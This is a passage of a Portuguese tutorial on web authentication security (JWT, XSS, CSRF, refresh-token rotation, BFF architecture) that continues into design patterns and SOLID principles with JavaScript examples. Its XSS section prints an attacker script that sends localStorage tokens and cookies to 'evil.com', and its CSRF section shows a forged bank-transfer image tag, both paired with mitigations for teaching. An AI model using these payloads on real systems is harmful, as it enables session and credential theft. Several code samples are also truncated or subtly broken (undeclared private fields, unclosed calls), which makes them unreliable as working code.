      if (err) reject(err);
      else resolve(decoded);
    });
  });
}

🚨 Problemas Reais com JWT

1. Algorithm confusion (alg:none):

// ❌ VULNERÁVEL — aceitar qualquer algoritmo
jwt.verify(token, secret); // se header tiver "alg":"none", passa sem verificar!

// ✅ Sempre especificar o algoritmo esperado
jwt.verify(token, secret, { algorithms: ['HS256'] });

2. Token vazado — o problema do stateless:

Um JWT válido não tem como ser invalidado antes de expirar sem manter estado no servidor (allowlist/denylist). Se o usuário faz logout ou o token é roubado, ainda é válido até exp. Soluções:

  • Exp curto (15min) + refresh token (renova silenciosamente)
  • Denylist por jti — guarda tokens revogados no Redis (aceita algum estado)
  • Opaque tokens — token é só um ID, dados ficam no servidor (stateful)

⚔️ Ataques de Autenticação Segurança

Você precisa pensar como hacker para defender como especialista.

💉 XSS — Cross-Site Scripting (CRÍTICO)

Analogia: XSS é como um ladrão que não arromba a porta — ele convence você a abri-la. O atacante injeta código JavaScript malicioso na sua página, que roda com as mesmas permissões do seu JS legítimo.

Como rouba tokens:

// Atacante injeta em um campo de comentário não sanitizado:
<script>
  // Se o token está em localStorage — roubado facilmente
  const token = localStorage.getItem('access_token');
  fetch('https://evil.com/steal?t=' + token);

  // Se o token está em cookie SEM HttpOnly — também roubado
  fetch('https://evil.com/steal?c=' + document.cookie);

  // Se o cookie tem HttpOnly — NÃO consegue ler o cookie
  // Mas pode fazer requests autenticados em nome do usuário!
  fetch('/api/transferir', {
    method: 'POST',
    credentials: 'include', // cookie vai junto
    body: JSON.stringify({ para: 'evil', valor: 9999 })

</script>

  • CSP (Content Security Policy) — bloqueia execução de scripts não autorizados
  • Sanitizar output — nunca inserir HTML/JS do usuário sem escape (textContent, não innerHTML)
  • HttpOnly nos cookies — JS não lê o cookie (não resolve se o atacante pode fazer requests)
  • Frameworks modernos — React/Vue fazem escape automático por padrão (dangerouslySetInnerHTML é a exceção)
// ❌ VULNERÁVEL
element.innerHTML = `Olá, ${nomeDoUsuario}`; // XSS se nome contiver <script>

// ✅ SEGURO — textContent faz escape automático
element.textContent = `Olá, ${nomeDoUsuario}`;

// ✅ SEGURO em React (escapa por padrão)
return <div>Olá, {nomeDoUsuario}</div>; // seguro
return <div dangerouslySetInnerHTML={{__html: nomeDoUsuario}} />; // PERIGOSO!

🎭 CSRF — Cross-Site Request Forgery

Analogia: Você está logado no banco. Um site malicioso tem uma imagem com src="https://banco.com/transferir?valor=1000¶=hacker". Quando seu browser carrega a imagem, faz a request autenticada — com seu cookie — sem você saber.
1. Você está logado no banco.com (cookie sessionId guardado) 2. Você visita site-malicioso.com 3. Site malicioso tem: <img src="https://banco.com/transferir?para=hacker&valor=1000"> ou um formulário que submita automaticamente 4. Seu browser carrega a "imagem" → faz GET para banco.com 5. banco.com recebe o request COM seu cookie de sessão 6. banco.com processa a transferência (se não tiver proteção CSRF)!

Mitigações:

  • SameSite=Lax/Strict — cookie não vai em requests cross-site (defesa principal moderna)
  • CSRF Token — servidor emite token único por sessão, formulário deve incluí-lo, servidor valida
  • Double Submit Cookie — token em cookie + no request body, servidor compara
  • Verificar Origin/Referer header — rejeitar requests de origens não esperadas
💡 Por que JWTs em header são imunes ao CSRF: O browser não envia automaticamente headers customizados cross-site. Authorization: Bearer xyz só é enviado por código JS — que é bloqueado pela SOP. Cookies são enviados automaticamente.

🔁 Replay Attack

Um token válido interceptado pode ser reutilizado pelo atacante até expirar.

Mitigações:

  • Expiração curta — access token com 15min de vida
  • jti (JWT ID) + denylist — token usado = invalidado no Redis
  • Nonce — valor único por request que o servidor rastreia
  • HTTPS obrigatório — elimina interceptação na rede (para a maioria dos casos)

🔁 Refresh Token — Nível Avançado Avançado

🔄 Conceito e Fluxo

Access tokens expiram rápido (15min). O refresh token é de longa duração e permite renovar o access token silenciosamente, sem pedir a senha de novo.

ACCESS TOKEN expira após 15 minutos. Request com token expirado → 401 Unauthorized RENOVAÇÃO SILENCIOSA: App detecta 401 (ou monitora exp do JWT) ↓ App envia refresh token para /token endpoint: POST /token {grant_type: refresh_token, refresh_token: xyz} ↓ Authorization Server valida o refresh token ↓ Authorization Server retorna: { access_token: NOVO, refresh_token: NOVO_TAMBÉM (rotation!), expires_in: 900 } ↓ App guarda o novo access token em memória App repete o request original com o novo token

🚨 Refresh Token Rotation — ESSENCIAL

Toda vez que um refresh token é usado, o Authorization Server emite um NOVO refresh token e invalida o antigo. Isso permite detectar roubo de refresh token.

REFRESH TOKEN ROTATION: Situação: atacante roubou o refresh token RT1 Usuário legítimo usa RT1 → AS emite RT2, invalida RT1 Atacante tenta usar RT1 → RT1 inválido! ↓ Mas... atacante usa RT1 ANTES do usuário: Atacante usa RT1 → AS emite RT2, invalida RT1 Usuário tenta usar RT1 → INVÁLIDO! ↓ AS detecta: RT1 foi usado 2x → FAMÍLIA DE TOKENS COMPROMETIDA! AS revoga TODOS os tokens dessa família → logout forçado AS alerta sistema de segurança → O usuário vai ter que fazer login de novo (experiência ruim mas segura) → O atacante perde o acesso
// Implementar retry com refresh no frontend (interceptor Axios)
import axios from 'axios';

let accessToken = null;
let isRefreshing = false;
let refreshSubscribers = [];

const api = axios.create({ baseURL: '/api' });

// Interceptor de request — adiciona access token
api.interceptors.request.use(config => {
  if (accessToken) {
    config.headers.Authorization = `Bearer ${accessToken}`;
  }
  return config;
});

// Interceptor de response — lida com 401
api.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      if (isRefreshing) {
        // Já está renovando — espera na fila
        return new Promise(resolve => {
          refreshSubscribers.push(token => {
            originalRequest.headers.Authorization = `Bearer ${token}`;
            resolve(api(originalRequest));
          });
        });
      }

      isRefreshing = true;
      try {
        // Refresh token está no cookie HttpOnly — backend lida com isso
        const { data } = await axios.post('/auth/refresh', {}, { withCredentials: true });
        accessToken = data.access_token;
        refreshSubscribers.forEach(cb => cb(accessToken));
        refreshSubscribers = [];
        originalRequest.headers.Authorization = `Bearer ${accessToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh falhou — logout
        accessToken = null;
        window.location.href = '/login';
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }
    return Promise.reject(error);
  }
);

🏛️ Arquitetura BFF Arquitetura

Backend for Frontend — a arquitetura que separa o que é "de frontend" do que é "de API", resolvendo segurança, performance e acoplamento de uma vez.

❌ Arquitetura Errada (Comum)

SPA ──────────────────────► API (com access token no browser) Problemas: ▸ Access token exposto no browser (XSS vaza tudo) ▸ SPA precisa gerenciar tokens (complexo) ▸ CORS complexo entre SPA e múltiplas APIs ▸ Lógica de autenticação duplicada em cada frontend

✅ Arquitetura Correta (Especialista)

SPA ──────────► BFF ──────────► APIs internas (browser) (seu servidor) (microserviços) ▲ │ Refresh Token (cookie HttpOnly) │ Session (cookie HttpOnly) │ Access Tokens (memória do BFF) Fluxo: 1. SPA não tem tokens! Só uma session com o BFF 2. BFF guarda os tokens OAuth (access + refresh) 3. BFF faz proxy autenticado para as APIs internas 4. APIs internas nunca expostas ao browser 5. Refresh token nunca toca o JavaScript do browser

Por que BFF é superior:

AspectoSPA direta na APICom BFF
Exposição de tokens❌ Tokens no browser✅ Tokens só no servidor
XSS impact❌ Token roubado = conta comprometida✅ XSS não acessa tokens
CORS❌ Complexo para cada API✅ Mesmo domínio (sem CORS)
Lógica de auth❌ No frontend (inseguro)✅ No backend (correto)
Custo operacional✅ Menos infra❌ Mais um serviço a operar
// BFF simples em Express — proxy autenticado
import express from 'express';
import { createProxyMiddleware } from 'http-proxy-middleware';

const app = express();

// Middleware de autenticação — valida a sessão do browser
app.use('/api', async (req, res, next) => {
  const session = req.cookies.session_id;
  const userData = await validateSession(session); // busca no Redis
  if (!userData) return res.status(401).json({ error: 'Não autenticado' });

  // BFF busca o access token do armazenamento seguro
  const accessToken = await getAccessToken(userData.userId);

  // Injeta o token no request para o microserviço
  req.headers.Authorization = `Bearer ${accessToken}`;
  next();
});

// Proxy para APIs internas — browser nunca acessa diretamente
app.use('/api/produtos', createProxyMiddleware({
  target: 'http://produtos-service:3001',
  changeOrigin: true,
}));

🔄 Tratamento de 401 vs 403

api.interceptors.response.use(
  response => response,
  async error => {
    const status = error.response?.status;

    if (status === 401) {
      // 401 = Não autenticado (token inválido/expirado)
      // Tentar renovar o token, se falhar → logout
      try {
        await renovarToken();
        return api(error.config); // repete o request
      } catch {
        logout(); // redireciona para /login
      }
    }

    if (status === 403) {
      // 403 = Autenticado mas sem permissão (authz failure)
      // NÃO tenta renovar o token — não vai resolver!
      // Redirecionar para página de "sem permissão"
      notificar('Você não tem permissão para esta ação');
      router.push('/sem-permissao');
    }

    return Promise.reject(error);
  }
);
💡 Diferença crítica: 401 → problema de identidade, tente renovar. 403 → problema de autorização, o usuário é quem é mas não pode fazer isso. Não confunda os dois.

function agendarLogout(accessToken) {
  const { exp } = parseJwt(accessToken);
  const msAteExpirar = exp * 1000 - Date.now() - 30000; // 30s antes de expirar

🏗️ Padrões Criacionais Design Patterns

Lidam com a criação de objetos — abstraem o processo de instanciação para que o código não dependa de classes concretas.

🔁 Singleton

Garante que uma classe tenha uma única instância e fornece um ponto de acesso global a ela.

Analogia: O presidente de um país. Pode haver muitos candidatos, mas só existe um presidente em exercício por vez. Todas as chamadas ao "presidente" chegam à mesma pessoa.

Quando usar:

  • Logger global, connection pool de banco de dados, cache em memória
  • Configuração global da aplicação
// Singleton em JS moderno — módulo ES é singleton por padrão
// db.js
let instance = null;

class Database {
  constructor(url) {
    if (instance) return instance; // retorna a instância existente
    this.connection = connect(url);
    instance = this;
  }

  query(sql) { return this.connection.execute(sql); }
}

export default Database;

// Uso — sempre a mesma instância
const db1 = new Database('postgres://...');
const db2 = new Database('postgres://...');
console.log(db1 === db2); // true

// ⚠️ Em módulos ES6, o próprio módulo é singleton:
// config.js
export const config = { env: 'prod', timeout: 3000 };
// Qualquer import de config.js recebe o MESMO objeto
⚠️ Trade-offs: Dificulta testes (estado global). Viola o princípio de single responsibility. Considere Dependency Injection como alternativa — mais testável e explícita.

🏭 Factory Method

Define uma interface para criar objetos, mas deixa as subclasses decidirem qual classe instanciar. O criador não sabe qual produto vai criar.

Analogia: Uma fábrica de veículos. A fábrica sabe como fazer veículos, mas a linha de produção específica (carros, motos, caminhões) decide o produto final. Você pede "crie um veículo", a linha correta é escolhida automaticamente.
// Sem Factory — acoplamento direto
class NotificationService {
  send(type, msg) {
    if (type === 'email') new EmailNotification(msg).send();
    else if (type === 'sms') new SMSNotification(msg).send();
    else if (type === 'push') new PushNotification(msg).send();
    // ← toda nova notificação exige modificar esta classe
  }
}

// COM Factory Method — aberto para extensão, fechado para modificação
class Notification {
  send(msg) { throw new Error('Implementar'); }
}

class EmailNotification extends Notification {
  send(msg) { console.log(`Email: ${msg}`); }
}
class SMSNotification extends Notification {
  send(msg) { console.log(`SMS: ${msg}`); }
}

// Factory — cria o objeto correto sem que o caller saiba
function createNotification(type) {
  const map = {
    email: EmailNotification,
    sms:   SMSNotification,
    push:  PushNotification,
  };
  const Cls = map[type];
  if (!Cls) throw new Error(`Tipo desconhecido: ${type}`);
  return new Cls();
}

// Uso — desacoplado do tipo concreto
createNotification('email').send('Seu pedido chegou!');

Quando usar:

  • Quando não sabe de antemão o tipo exato de objeto a criar
  • Quando quer que usuários da lib possam estender os produtos criados
  • Parsers, serializers, geradores de relatório por formato

🏗️ Abstract Factory

Produz famílias de objetos relacionados sem especificar suas classes concretas. É como um Factory Method, mas para grupos de objetos que precisam trabalhar juntos.

Analogia: Uma loja de móveis. Você pede "estilo moderno" — a loja te entrega sofá moderno + mesa moderna + cadeira moderna. Todos do mesmo estilo, funcionando juntos. Se pedir "estilo rústico", recebe toda a família rústica.
// Famílias de UI components — Light Theme e Dark Theme
// Precisam ser consistentes entre si

// Interfaces (produtos)
class Button { render() {} }
class Input  { render() {} }

// Família Light
class LightButton extends Button { render() { return '<button class="light">'; } }
class LightInput  extends Input  { render() { return '<input class="light">'; } }

// Família Dark
class DarkButton extends Button { render() { return '<button class="dark">'; } }
class DarkInput  extends Input  { render() { return '<input class="dark">'; } }

// Abstract Factory
class UIFactory {
  createButton() {}
  createInput()  {}
}

class LightUIFactory extends UIFactory {
  createButton() { return new LightButton(); }
  createInput()  { return new LightInput();  }
}

class DarkUIFactory extends UIFactory {
  createButton() { return new DarkButton(); }
  createInput()  { return new DarkInput();  }
}

// Código cliente — não sabe qual família está usando
function renderForm(factory) {
  const btn = factory.createButton();
  const inp = factory.createInput();
  btn.render(); inp.render();
}

const theme = userPreference === 'dark' ? new DarkUIFactory() : new LightUIFactory();
renderForm(theme);

🧱 Builder

Constrói objetos complexos passo a passo. Permite criar diferentes representações usando o mesmo processo de construção.

Analogia: Montar um hambúrguer. Você vai dizendo: "pão", "carne", "queijo", "sem cebola", "molho especial". O atendente (Builder) monta na ordem certa e te entrega o produto final. Você não precisa saber como montar — só pedir as partes que quer.
// Problema: construtor com muitos parâmetros opcionais
// new User(nome, email, null, null, true, false, 'admin', null) ← péssimo!

// Builder resolve isso com fluent interface
class QueryBuilder {
  #table = '';
  #conditions = [];
  #columns = ['*'];
  #limit = null;
  #orderBy = null;

  from(table)       { this.#table = table; return this; }
  select(...cols)   { this.#columns = cols; return this; }
  where(cond)       { this.#conditions.push(cond); return this; }
  limitTo(n)        { this.#limit = n; return this; }
  orderBy(col, dir) { this.#orderBy = `${col} ${dir}`; return this; }

  build() {
    let sql = `SELECT ${this.#columns.join()} FROM ${this.#table}`;
    if (this.#conditions.length) sql += ` WHERE ${this.#conditions.join(' AND ')}`;
    if (this.#orderBy) sql += ` ORDER BY ${this.#orderBy}`;
    if (this.#limit)   sql += ` LIMIT ${this.#limit}`;
    return sql;
  }
}

// Uso — legível e extensível
const query = new QueryBuilder()
  .from('produtos')
  .select('id', 'nome', 'preco')
  .where('ativo = true')
  .where('preco > 100')
  .orderBy('preco', 'DESC')
  .limitTo(20)
  .build();
// SELECT id, nome, preco FROM produtos WHERE ativo = true AND preco > 100 ORDER BY preco DESC LIMIT 20

Quando usar:

  • Objetos com muitos parâmetros opcionais (evita "telescoping constructor")
  • Query builders, geradores de HTML, configuração de SDKs
  • Quando o processo de criação deve ser separado da representação

🧬 Prototype

Cria novos objetos copiando um existente (o protótipo), em vez de construir do zero.

// Útil quando criar um objeto do zero é caro (ex: consulta ao banco)
class ConfiguracaoRelatorio {
  constructor() {
    // Operação cara: busca 50 configurações padrão do banco
    this.campos = buscarCamposPadrao();
    this.filtros = buscarFiltrosPadrao();
    this.tema = 'claro';
  }

  clone() {
    // Cópia barata — não vai ao banco de novo
    const copia = Object.create(this);

    copia.filtros = { ...this.filtros };
    return copia;
  }
}

🔧 Padrões Estruturais Design Patterns

Lidam com a composição de classes e objetos para formar estruturas maiores e mais flexíveis.

🔌 Adapter

Permite que objetos com interfaces incompatíveis colaborem. É uma "tomada universal" entre dois sistemas.

Analogia: Você comprou um aparelho americano (110V, plug tipo A) mas a tomada é brasileira (220V, tipo N). O adaptador/transformador faz a ponte — nenhum dos dois precisa mudar.
// Sistema legado: API de pagamento antiga
class PagamentoLegado {
  processarCartao(numeroCartao, valor, expiracao) {
    console.log(`Processando R$${valor} no cartão ${numeroCartao}`);
  }
}

// Nova interface esperada pelo sistema
class ProcessadorPagamento {
  pagar({ cartao, valor }) {}
}

// Adapter — adapta o legado para a nova interface
class AdapterPagamento extends ProcessadorPagamento {
  #legado;
  constructor() { super(); this.#legado = new PagamentoLegado(); }

  pagar({ cartao, valor }) {
    // Traduz da interface nova para a interface legada
    this.#legado.processarCartao(cartao.numero, valor, cartao.expiracao);
  }
}

// Uso — o sistema novo não sabe que está usando o sistema legado
const pagador = new AdapterPagamento();
pagador.pagar({ cartao: { numero: '4111...', expiracao: '12/26' }, valor: 99.90 });

No frontend:

  • Integrar libs de terceiros com API diferente da sua
  • Adaptar respostas de API externa para o formato interno da app
  • Migrar de uma lib para outra sem quebrar o código que a usa

🪆 Decorator

Adiciona comportamentos a objetos dinamicamente, envolvendo-os em objetos wrapper. Alternativa à herança para estender funcionalidades.

Analogia: Um café. Café puro é a base. Você pode adicionar: leite (+R$1), açúcar (+R$0,50), chantilly (+R$2). Cada adição envolve o anterior e adiciona seu comportamento. Sem mudar a classe Café original.
// Base
class Requisicao {
  fetch(url) { return fetch(url); }
}

// Decorator: adiciona autenticação
class ComAutenticacao {
  #base;
  constructor(base) { this.#base = base; }
  fetch(url) {
    const token = getAccessToken();
    return this.#base.fetch(url, {
      headers: { Authorization: `Bearer ${token}` }
    });
  }
}

// Decorator: adiciona retry
class ComRetry {
  #base; #tentativas;
  constructor(base, tentativas = 3) {
    this.#base = base; this.#tentativas = tentativas;
  }
  async fetch(url, opts) {
    for (let i = 0; i < this.#tentativas; i++) {
      try { return await this.#base.fetch(url, opts); }
      catch (e) { if (i === this.#tentativas - 1) throw e; }
    }
  }
}

// Decorator: adiciona cache
class ComCache {
  #base; #cache = new Map();
  constructor(base) { this.#base = base; }
  async fetch(url, opts) {
    if (this.#cache.has(url)) return this.#cache.get(url);
    const res = await this.#base.fetch(url, opts);
    this.#cache.set(url, res);
    return res;
  }
}

// Compõe decorators — ordem importa!
const http = new ComCache(new ComRetry(new ComAutenticacao(new Requisicao()), 3));
http.fetch('/api/produtos'); // tem auth + retry + cache

🪟 Facade

Fornece uma interface simplificada para um subsistema complexo. Esconde a complexidade interna atrás de uma API limpa.

Analogia: Controle remoto da TV. Por baixo há placa de vídeo, processador de áudio, sistema de tuning, firmware complexo. Você só aperta "Ligar" e "Volume+". A fachada é o controle remoto.
// Subsistema complexo — muitas classes interagindo
class AudioEngine   { inicializar() {} carregar(f) {} }
class VideoDecoder  { decodificar(f) {} setQuality(q) {} }
class BufferManager { alocar(mb) {} }
class NetworkStream { conectar(url) {} setProtocol(p) {} }

// Facade — interface simples para o usuário
class VideoPlayer {

  #video  = new VideoDecoder();
  #buffer = new BufferManager();
  #stream = new NetworkStream();

  play(url, quality = 'HD') {
    this.#buffer.alocar(512);
    this.#stream.setProtocol('HLS');
    this.#stream.conectar(url);
    this.#audio.inicializar();
    this.#video.setQuality(quality);
    this.#audio.carregar(url);
    this.#video.decodificar(url);

🌳 Composite

Compõe objetos em estruturas de árvore para representar hierarquias parte-todo. Permite tratar objetos individuais e composições uniformemente.

// Exemplo clássico: sistema de arquivos
class FileSystemItem {
  constructor(nome) { this.nome = nome; }
  tamanho() { return 0; }
  listar(prefixo = '') {}
}

class Arquivo extends FileSystemItem {
  constructor(nome, tamanhoKb) {
    super(nome); this._tamanho = tamanhoKb;
  }
  tamanho() { return this._tamanho; }
  listar(prefixo) { console.log(`${prefixo}📄 ${this.nome} (${this._tamanho}kb)`); }
}

class Pasta extends FileSystemItem {
  #filhos = [];
  adicionar(item) { this.#filhos.push(item); return this; }
  tamanho()       { return this.#filhos.reduce((t, f) => t + f.tamanho(), 0); }
  listar(prefixo = '') {
    console.log(`${prefixo}📁 ${this.nome}/`);
    this.#filhos.forEach(f => f.listar(prefixo + '  '));
  }
}

// Estrutura em árvore — trata Arquivo e Pasta uniformemente
const raiz = new Pasta('projeto')
  .adicionar(new Arquivo('README.md', 2))
  .adicionar(new Pasta('src')
    .adicionar(new Arquivo('index.ts', 10))
    .adicionar(new Arquivo('App.tsx', 8))
  );

raiz.listar();
// 📁 projeto/
//   📄 README.md (2kb)
//   📁 src/
//     📄 index.ts (10kb)
//     📄 App.tsx (8kb)
console.log(raiz.tamanho()); // 20kb

🔒 Proxy

Fornece um substituto que controla o acesso a outro objeto. Pode adicionar cache, validação, lazy loading ou logging sem modificar o objeto original.

// Proxy de API com cache automático
const api = new Proxy(fetch, {
  apply(target, thisArg, [url, options]) {
    const cacheKey = `${options?.method || 'GET'}:${url}`;

    if (!options?.method || options.method === 'GET') {
      const cached = sessionStorage.getItem(cacheKey);
      if (cached) return Promise.resolve(JSON.parse(cached));
    }

    return target.call(thisArg, url, options).then(async res => {
      const data = await res.json();
      if (!options?.method || options.method === 'GET') {
        sessionStorage.setItem(cacheKey, JSON.stringify(data));
      }
      return data;
    });
  }
});

// JS tem Proxy nativo — útil para reatividade (base do Vue 3!)
const state = new Proxy({ count: 0 }, {
  set(target, prop, value) {
    console.log(`${prop} mudou: ${target[prop]} → ${value}`);
    target[prop] = value;
    atualizarDOM(prop, value); // reatividade!
    return true;
  }
});

🎭 Padrões Comportamentais Design Patterns

Lidam com algoritmos e a atribuição de responsabilidades entre objetos.

👀 Observer

Define uma dependência um-para-muitos: quando um objeto muda, todos os dependentes são notificados automaticamente.

Analogia: Newsletter. Você assina (subscribe). Quando a empresa publica (notify), todos os assinantes recebem. Você pode cancelar (unsubscribe) a qualquer hora.
class EventEmitter {
  #handlers = new Map();

  on(event, fn) {
    if (!this.#handlers.has(event)) this.#handlers.set(event, new Set());
    this.#handlers.get(event).add(fn);
    return () => this.off(event, fn); // retorna unsubscribe
  }

  off(event, fn) { this.#handlers.get(event)?.delete(fn); }

  emit(event, data) {
    this.#handlers.get(event)?.forEach(fn => fn(data));
  }
}

// Exemplo prático: estado reativo
class Store extends EventEmitter {
  #state;
  constructor(initialState) { super(); this.#state = initialState; }

  setState(partial) {
    const prev = this.#state;
    this.#state = { ...prev, ...partial };
    this.emit('change', { prev, next: this.#state });
  }

  getState() { return this.#state; }
}

const store = new Store({ user: null, cart: [] });

// Componentes "ouvem" mudanças
const unsub = store.on('change', ({ next }) => {
  renderHeader(next.user);
  renderCart(next.cart);
});

store.setState({ user: { nome: 'Edu' } }); // notifica todos os observers

// Base de: RxJS, Redux, Vue 3 (reactivity), Zustand

🎯 Strategy

Define uma família de algoritmos, encapsula cada um e os torna intercambiáveis. O algoritmo pode variar independentemente do cliente que o usa.

Analogia: GPS com várias rotas — mais rápida, mais curta, evitar pedágio. Você escolhe a estratégia. O GPS não muda, só o algoritmo de rota.
// Estratégias de ordenação
const strategies = {
  price_asc:  (a, b) => a.preco - b.preco,
  price_desc: (a, b) => b.preco - a.preco,
  name_asc:   (a, b) => a.nome.localeCompare(b.nome),
  rating:     (a, b) => b.avaliacao - a.avaliacao,
};

// Context — usa a estratégia sem saber qual é
class ListaProdutos {
  #estrategia;

  setEstrategia(nome) {
    if (!strategies[nome]) throw new Error(`Estratégia desconhecida: ${nome}`);
    this.#estrategia = strategies[nome];
  }

  ordenar(produtos) {
    return [...produtos].sort(this.#estrategia);
  }
}

const lista = new ListaProdutos();
lista.setEstrategia('price_asc');
lista.ordenar(produtos);

// Adicionar nova estratégia sem modificar ListaProdutos
strategies.discount = (a, b) => b.desconto - a.desconto;
💡 No frontend: Funções de primeira classe tornam Strategy natural em JS. Passar uma função como parâmetro já é o padrão Strategy. Ex: array.sort(compareFn), array.filter(predicateFn).

🔗 Chain of Responsibility

Permite passar requests por uma cadeia de handlers. Cada handler decide processar ou passar adiante.

Analogia: Suporte ao cliente. Você liga com um problema. O atendente tenta resolver → não consegue → escalona para o supervisor → não consegue → escalona para engenharia. Cada elo da cadeia tenta lidar com o problema.
// Middleware pipeline (como Express.js!)
class MiddlewarePipeline {
  #middlewares = [];

  use(fn) { this.#middlewares.push(fn); return this; }

  async execute(context) {
    const run = async (i) => {
      if (i >= this.#middlewares.length) return;
      await this.#middlewares[i](context, () => run(i + 1));
    };
    await run(0);
  }
}

const pipeline = new MiddlewarePipeline()
  .use(async (ctx, next) => {
    console.log('1. Logging');
    await next();
    console.log('1. Logging pós');
  })
  .use(async (ctx, next) => {
    if (!ctx.user) { ctx.error = 'Não autenticado'; return; } // bloqueia a chain
    await next();
  })
  .use(async (ctx, next) => {
    ctx.data = await buscarDados(ctx.user.id);
    await next();
  });

🎬 Command

Encapsula uma request como objeto, permitindo parametrizar clientes, enfileirar requests, e suportar operações desfazíveis (undo).

// Editor de texto com undo/redo
class TextEditor {
  #content = '';
  #history = [];
  #redoStack = [];

  execute(command) {
    command.execute(this);
    this.#history.push(command);
    this.#redoStack = []; // nova ação limpa redo
  }

  undo() {
    const cmd = this.#history.pop();
    if (cmd) { cmd.undo(this); this.#redoStack.push(cmd); }
  }

  redo() {
    const cmd = this.#redoStack.pop();
    if (cmd) { cmd.execute(this); this.#history.push(cmd); }
  }

  get content() { return this.#content; }
  set content(v) { this.#content = v; }
}

class InsertCommand {
  #text; #position; #prevContent;
  constructor(text, position) { this.#text = text; this.#position = position; }
  execute(editor) {
    this.#prevContent = editor.content;
    const c = editor.content;
    editor.content = c.slice(0, this.#position) + this.#text + c.slice(this.#position);
  }
  undo(editor) { editor.content = this.#prevContent; }
}

const editor = new TextEditor();
editor.execute(new InsertCommand('Olá', 0));
editor.execute(new InsertCommand(' Mundo', 3));
editor.undo(); // desfaz " Mundo"

🪨 SOLID Princípios

5 princípios para código orientado a objetos que é fácil de manter, estender e testar. São guias, não leis absolutas.

S — Single Responsibility Principle

"Uma classe deve ter apenas um motivo para mudar."
Cada módulo/classe/função deve fazer uma coisa e fazê-la bem.

Analogia: Um funcionário com múltiplas funções é um gargalo — se ficar doente, tudo para. Um funcionário com uma especialidade pode ser substituído ou escalado facilmente.
// ❌ VIOLA SRP — UserService faz 4 coisas diferentes
class UserService {
  createUser(data) { /* valida, salva no banco */ }
  sendWelcomeEmail(user) { /* envia email */ }
  logUserCreation(user) { /* escreve log */ }
  generateReport() { /* gera relatório de usuários */ }
}
// Motivos para mudar: regra de negócio, sistema de email, formato de log, relatório

// ✅ SRP — cada classe tem UMA responsabilidade
class UserRepository { save(user) { /* só persiste */ } }
class EmailService    { sendWelcome(user) { /* só envia email */ } }
class UserLogger      { logCreation(user) { /* só loga */ } }
class UserReporter    { generate() { /* só gera relatório */ } }

class UserService {
  constructor(repo, email, logger) {
    this.repo = repo; this.email = email; this.logger = logger;
  }
  createUser(data) {
    const user = this.repo.save(data);
    this.email.sendWelcome(user);
    this.logger.logCreation(user);
    return user;
  }
}

O — Open/Closed Principle

"Aberto para extensão, fechado para modificação."
Adicione funcionalidades sem modificar o código existente.

// ❌ VIOLA OCP — toda nova forma de desconto exige modificar esta classe
class Desconto {
  calcular(tipo, valor) {
    if (tipo === 'black_friday') return valor * 0.5;
    if (tipo === 'vip')         return valor * 0.8;
    if (tipo === 'estudante')   return valor * 0.9;
    // Adicionar novo desconto = modificar esta função
  }
}

// ✅ OCP — novos descontos sem modificar código existente
class CalculadorDesconto {
  #estrategias = new Map();

  registrar(tipo, fn) { this.#estrategias.set(tipo, fn); return this; }

  calcular(tipo, valor) {
    const fn = this.#estrategias.get(tipo);
    if (!fn) throw new Error(`Desconto desconhecido: ${tipo}`);
    return fn(valor);
  }
}

const calculador = new CalculadorDesconto()
  .registrar('black_friday', v => v * 0.5)
  .registrar('vip',         v => v * 0.8);

// Adicionar novo desconto SEM modificar a classe:
calculador.registrar('estudante', v => v * 0.9);

L — Liskov Substitution Principle

"Subtipos devem ser substituíveis por seus tipos base."
Se S herda de T, qualquer lugar que usa T deve funcionar com S sem surpresas.

// ❌ VIOLA LSP — Pato de borracha herda de Pato mas não pode voar
class Pato {
  voar()  { console.log('Voando...'); }
  grasnar() { console.log('Quack!'); }
}

class PatoDeBorracha extends Pato {
  voar() { throw new Error('Patos de borracha não voam!'); }
  // Código que esperava "voar()" funcionar vai quebrar com PatoDeBorracha
}

// ✅ LSP — separar interfaces que fazem sentido para cada tipo
class Ave {
  grasnar() { console.log('Quack!'); }
}

class AveVoadora extends Ave {
  voar() { console.log('Voando...'); }
}

class Pato extends AveVoadora {}     // pode grasnar E voar ✅
class PatoDeBorracha extends Ave {}  // só grasna ✅ (não herda voar)
⚠️ Sinal de violação: Se uma subclasse sobrescreve um método apenas para lançar exceção ou não fazer nada, provavelmente você tem um problema de hierarquia. "Prefira composição à herança."

I — Interface Segregation Principle

"Clientes não devem depender de interfaces que não usam."
Interfaces gordas forçam implementadores a depender de coisas que não precisam.

// ❌ VIOLA ISP — interface gorda que ninguém implementa totalmente
interface Worker {
  trabalhar(): void;
  comer(): void;
  dormir(): void;
  carregarPesos(): void;  // robô não faz isso!
}

// Robot é forçado a implementar comer() e dormir() que não fazem sentido
class Robot implements Worker {
  trabalhar() { /* ok */ }
  comer()     { throw new Error('Robôs não comem'); } // ← ISP violado
  dormir()    { throw new Error('Robôs não dormem'); }
  carregarPesos() { /* ok */ }
}

// ✅ ISP — interfaces menores e coesas
interface Trabalhador  { trabalhar(): void; }
interface SerVivo      { comer(): void; dormir(): void; }
interface Carregador   { carregarPesos(): void; }

class Humano implements Trabalhador, SerVivo, Carregador { /* implementa tudo */ }
class Robot  implements Trabalhador, Carregador { /* só o que faz sentido */ }

D — Dependency Inversion Principle

"Dependa de abstrações, não de implementações concretas."
Módulos de alto nível não devem depender de módulos de baixo nível. Ambos devem depender de abstrações.

// ❌ VIOLA DIP — acoplamento direto com implementação concreta
class PedidoService {
  #db = new MySQLDatabase(); // acoplado ao MySQL!

  criarPedido(dados) {
    this.#db.save(dados); // impossível testar sem MySQL real
  }
}

// ✅ DIP — depende de abstração (injeção de dependência)
// Abstração (interface)
class Database {
  save(data) { throw new Error('Implementar'); }
  find(id)   { throw new Error('Implementar'); }
}

// Implementações concretas (baixo nível)
class MySQLDatabase extends Database {
  save(data) { /* MySQL específico */ }
  find(id)   { /* MySQL específico */ }
}

class InMemoryDatabase extends Database {
  #data = new Map();
  save(data) { this.#data.set(data.id, data); }
  find(id)   { return this.#data.get(id); }
}

// Alto nível depende da abstração — não do MySQL
class PedidoService {
  constructor(db) { this.#db = db; } // recebe via injeção
  criarPedido(dados) { this.#db.save(dados); }
}

// Produção:
const service = new PedidoService(new MySQLDatabase());
// Teste (sem banco real!):
const serviceTest = new PedidoService(new InMemoryDatabase());

// useReducer — gerenciar estado complexo com transições explícitas
